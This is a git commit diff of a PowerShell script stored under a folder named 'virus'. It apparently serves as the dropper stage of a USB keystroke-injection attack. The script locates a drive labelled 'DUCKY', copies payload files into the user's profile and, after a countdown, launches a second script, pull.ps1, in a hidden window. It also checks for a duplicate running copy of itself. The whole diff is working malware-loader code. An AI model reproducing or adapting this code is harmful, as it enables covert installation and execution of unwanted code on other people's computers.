f4ec2694b3895458b616178ca61b6e858124cd83
Mavis Coffey <129871621+mavisinator30001@users.noreply.github.com>
2025-01-03 15:22:50 -0500

    Update call.ps1

--- virus/call.ps1
+++ virus/call.ps1
@@ -1,15 +1,34 @@
+$currentPID = $PID
+$duplicateProcess = Get-Process -Name "powershell" | Where-Object { $_.Id -ne $currentPID -and $_.CommandLine -match $MyInvocation.MyCommand.Path }
+
+if ($duplicateProcess.Count -gt 1) {
+    Write-Output "Duplicate found. Terminating new process..."
+    exit 1
+}
+
 
 $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
 $localUsername = $env:USERNAME
-New-Item -Path "C:\Users\$localUsername\Documents" -Name 'virus' -ItemType "directory"
-New-Item -Path "C:\Users\$localUsername\Documents\virus" -Name 'Virus' -ItemType "directory"
-$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\virus" -Recurse -Filter "pull.ps1"
-
+New-Item -Path "C:\Users\$localUsername\Document" -Name 'virus' -ItemType "directory"
+# New-Item -Path "C:\Users\$localUsername\Document\virus" -Name 'Virus' -ItemType "directory"
+$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\virus\*" -Filter "pull.ps1" 
+$pullPathBeforeDelayCopy = Get-ChildItem -Path "C:\Users\$env:USERNAME\Contacts\virus" -Recurse -Filter "pull.ps1"
 $pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "virus"
-$pathAfterCopy = "C:\Users\$localUsername\Documents\virus"
+$pathBeforeDelayedCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus
+$pathAfterCopy = "C:\Users\$localUsername\Document\virus"
 
-Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
-Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy\Virus
+
+if ($driveLetter) {
+    Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
+    Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy
+    Write-Host 'True'
+    Write-Host $pathBeforeCopy
+} else {
+    Copy-Item -Path $pathBeforeDelayedCopy -Destination $pathAfterCopy -Recurse
+    Copy-Item -Path $pullPathBeforeDelayCopy -Destination $pathAfterCopy
+    Write-Host "False"
+}
+
 
 $time_in_seconds = 10
 while ($time_in_seconds -gt 0) {
@@ -17,6 +36,6 @@ while ($time_in_seconds -gt 0) {
     Start-Sleep -Seconds 1
     $time_in_seconds--
 }
-Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\Virus\pull.ps1" -WindowStyle Hidden
+Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\pull.ps1" -WindowStyle Hidden
 
 exit
